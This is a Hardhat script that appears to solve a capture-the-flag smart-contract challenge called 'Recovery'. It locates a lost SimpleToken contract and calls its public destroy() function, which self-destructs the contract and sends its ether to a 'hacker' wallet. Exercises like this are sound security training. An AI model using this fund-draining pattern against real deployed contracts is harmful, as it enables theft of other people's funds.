const { assert } = require("console");
const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config({ path: ".env" });

CONTRACT_NAME = "Recovery"

async function getContract(wallet) {
  const factory = await hre.ethers.getContractFactory(CONTRACT_NAME);
  let contract = null;
  if(hre.network.name == "hardhat") {
    contract = await factory.deploy();
    await contract.deployed();
    await (await contract.generateToken("token", "20")).wait();
  }
  else {
    contract = factory.attach(process.env.CONTRACT_ADDRESS);
  }
  return contract.connect(wallet);
}

async function giveWalletMoney(hacker) {
  assert(hre.network.name == "hardhat");
  const [owner] = await ethers.getSigners();
  const trans = await owner.sendTransaction({
    to: hacker.address,
    value: ethers.utils.parseEther("0.1"),
  });
  await trans.wait()
}

async function main() {
  console.log("network name:", hre.network.name);
  const hacker = new ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  contract = await getContract(hacker);
  if(hre.network.name == "hardhat") {
    console.log("getting some eth")
    giveWalletMoney(hacker);
  }

  console.log("hacking contract:", contract.address);

  /*let etherscan = new ethers.providers.EtherscanProvider("goerli");
  let contractTransactions = await etherscan.getHistory(contract.address);
  for(let tx of contractTransactions) {
    console.log("to:", tx.to, "from:", tx.from, "caddr:", tx.contractAddress);
    if(tx.to == null && tx.from == contract.address) {
      console.log("found contract, balance:", ethers.provider.getBalance(tx.contractAddress));
      const factory = await hre.ethers.getContractFactory("SimpleToken", hacker);
      let recoveredContract = factory.attach(tx.contractAddress);
      await (await recoveredContract.destroy(hacker.address)).wait();
      return
    }
  }
  console.log("didn't find the contract transaction");*/

  const contractAddress = "0xADE237218c46a7C1c8b1d7f1d0E036e3D444e81F" // found on etherscan

  console.log("contract balance:", await ethers.provider.getBalance(contractAddress));
  const factory = await hre.ethers.getContractFactory("SimpleToken", hacker);
  let recoveredContract = factory.attach(contractAddress);
  await (await recoveredContract.destroy(hacker.address)).wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});